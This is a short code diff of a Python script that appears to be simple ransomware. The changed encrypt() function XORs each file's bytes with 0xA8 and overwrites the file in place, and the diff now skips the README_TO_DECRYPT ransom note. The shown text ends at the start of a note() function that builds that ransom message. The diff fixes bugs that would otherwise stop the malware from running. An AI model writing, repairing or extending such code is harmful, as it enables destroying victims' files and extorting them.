@@ -19,16 +19,19 @@ def xord(data):
 
 #It will XOR the data from a file once with b^0xA8
 def encrypt(file):
-    try:
-        with open(file, 'rb') as f:
-            data = f.read()
-    except:
-        continue
-    try:
-        with open(file, 'wb') as fp:
-            fp.write(xord(data))
-    except:
-        continue
+    if os.path.splitext(file)[0] == "README_TO_DECRYPT":
+        pass
+    else:
+        try:
+            with open(file, 'rb') as f:
+                data = f.read()
+        except:
+            pass
+        try:
+            with open(file, 'wb') as fp:
+                fp.write(xord(data))
+        except:
+            pass
 
 def note(userdir):
     note = """ 
